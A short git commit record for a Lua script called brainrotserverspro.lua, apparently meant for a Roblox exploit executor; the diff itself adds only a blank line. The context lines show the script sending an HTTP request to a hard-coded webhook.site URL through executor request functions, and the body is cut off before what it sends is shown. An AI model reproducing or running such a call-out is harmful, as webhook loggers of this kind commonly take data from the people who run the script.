cc8959cbe278fcea15484377c2617ce8d655ee9c
vshahahsjjshhsywyyagsgs-eng <vshahahsjjshhsywyyagsgs@gmail.com>
2026-02-22 21:12:57 +0300

    Update brainrotserverspro.lua

--- brainrotserverspro.lua
+++ brainrotserverspro.lua
@@ -1,6 +1,7 @@
 -- [[ brainrotserverspro V1 ]] --
 local url = "https://webhook.site/9356d419-309f-47d3-a7fc-0aca9f7e25c1"
 local http = (syn and syn.request) or (http_request) or request
+
 if http then
     http({
         Url = url,
